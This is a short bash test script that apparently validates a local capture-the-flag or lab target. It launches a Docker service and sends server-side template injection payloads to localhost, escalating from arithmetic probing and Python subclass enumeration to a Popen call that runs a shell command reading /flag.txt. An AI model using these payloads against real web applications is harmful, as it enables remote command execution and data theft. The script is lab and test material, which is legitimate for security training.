#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

# 1. Normal render
OUT=$(curl -sf "http://localhost:8080/render?name=World")
if echo "$OUT" | grep -q "Hello, World"; then
  echo "[+] PASS: normal render works"
else
  echo "[-] FAIL: $OUT"; exit 1
fi

# 2. Arithmetic SSTI probe
OUT=$(curl -sf "http://localhost:8080/render?name=%7B%7B7*7%7D%7D")
if echo "$OUT" | grep -q '"49"'; then
  echo "[+] PASS: arithmetic expression evaluated"
else
  echo "[-] FAIL arithmetic: $OUT"; exit 1
fi

# 3. Subclass enumeration
OUT=$(curl -sf "http://localhost:8080/render?name=%7B%7B''.__class__.__mro__%5B1%5D.__subclasses__()%7D%7D")
if echo "$OUT" | grep -q "subprocess.Popen"; then
  echo "[+] PASS: subclass enumeration returned"
else
  echo "[-] FAIL subclasses: $OUT"; exit 1
fi

# 4. RCE via popen to read flag
PAYLOAD="%7B%7B''.__class__.__mro__%5B1%5D.__subclasses__()%5B80%5D('cat%20/flag.txt'%2Cshell%3DTrue%2Cstdout%3D-1).communicate()%5B0%5D%7D%7D"
OUT=$(curl -sf "http://localhost:8080/render?name=${PAYLOAD}")
if echo "$OUT" | grep -qE 'POC\{[0-9a-f]{32}\}'; then
  echo "[+] PASS: flag captured via SSTI RCE"
else
  echo "[-] FAIL RCE: $OUT"; exit 1
fi

echo "[+] All tests passed"
